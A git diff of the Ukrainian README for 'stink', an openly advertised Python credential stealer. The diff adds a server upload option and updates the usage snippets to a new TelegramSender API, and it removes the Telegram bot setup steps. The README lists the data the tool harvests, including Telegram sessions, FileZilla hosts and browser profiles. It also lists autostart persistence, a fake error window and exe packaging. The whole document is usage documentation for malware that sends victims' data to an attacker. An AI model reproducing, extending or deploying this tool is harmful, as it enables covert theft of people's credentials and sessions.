@@ -1,6 +1,8 @@
 # stink
 
-Стилер всього лише у 3 рядки з відправкою до Telegram.
+Стилер всього лише в декілька рядків з відправкою до Telegram / Server.
+
+**Wiki:** https://github.com/FallenAstaroth/stink/wiki
 
 ## Опис
 `stink` вже має значний функціонал, який тільки розширюватиметься.
@@ -11,9 +13,6 @@
   * [Стандартний](#Стандартний)
   * [Певні модулі](#Певні-модулі)
   * [Додаткові параметри](#Додаткові-параметри)
-* [Налаштування Telegram бота](#Налаштування-Telegram-бота)
-  * [Отримання токена](#Отримання-токена)
-  * [Отримання айді](#Отримання-айді)
 * [Створення exe](#Створення-exe)
   * [Створення виконуваного файла](#Створення-виконуваного-файла)
   * [За допомогою BAT](#За-допомогою-BAT)
@@ -41,7 +40,7 @@
    - Сесії Telegram
    - Хости FileZilla
 3. Підтримка мультипрофілів браузера.
-4. Відправка зібраних даних архівом в Telegram.
+4. Відправка зібраних даних архівом в Telegram / Server.
 5. Виконання в окремому потоці.
 6. Виконання з використанням багатопроцесорності.
 7. Можливість додання в автозапуск.
@@ -51,9 +50,10 @@
 ### Стандартний
 ```python
 from stink import Stealer
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)]).run()
 ```
 ### Певні модулі
 
@@ -61,9 +61,10 @@ if __name__ == '__main__':
 ```python
 from stink import Stealer
 from stink.enums import Features
+from stink.utils.senders import TelegramSender
 
 if __name__ == '__main__':
-    Stealer(token="YOUR_TOKEN", user_id=YOUR_ID, features=[Features.system, Features.screenshot]).run()
+    Stealer(senders=[TelegramSender(token="YOUR_TOKEN", user_id=YOUR_ID)], features=[Features.system, Features.screenshot]).run()
 ```
 ### Додаткові параметри
 
@@ -102,41 +103,6 @@ if __name__ == '__main__':
   - `message` - вивід фейкового вікна помилки.
 
 Передавайте якщо потрібно включити додаткові утиліти. Утиліти для списку можна імпортувати з `stink.enums.Utils`.
-
-## Налаштування Telegram бота
-### Отримання токена
-1. Відкриваємо чат з [BotFather](https://t.me/botfather).
-2. Прописуємо команду ```/newbot```.
-
-<p align="left">
-  <a href="">
-    <img src="_1.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-3. Прописуємо назву бота, далі нік з прикладкою ```_bot``` в кінці.
-
-<p align="left">
-  <a href="">
-    <img src="_2.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-4. Отриманий токен вставляємо в поле ```"YOUR_TOKEN"``` в скрипті.
-
-### Отримання айді
-1. Відкриваємо чат з [Get My ID](https://t.me/getmyid_bot).
-2. Прописуємо команду ```/start```.
-
-<p align="left">
-  <a href="">
-    <img src="_3.png" width="500px" style="display: inline-block;">
-  </a>
-</p>
-
-3. Отриманий айді вставляємо в поле ```YOUR_ID``` в скрипті.
-
-Після цього потрібно написати боту будь-яке повідомлення, щоб він міг відправляти нам архів.
 
 ## Створення exe
 Python являється інтерпретованою мовою програмування, тому ми спочатку транслюємо його в C, а потім скомпілюємо в .exe файл.
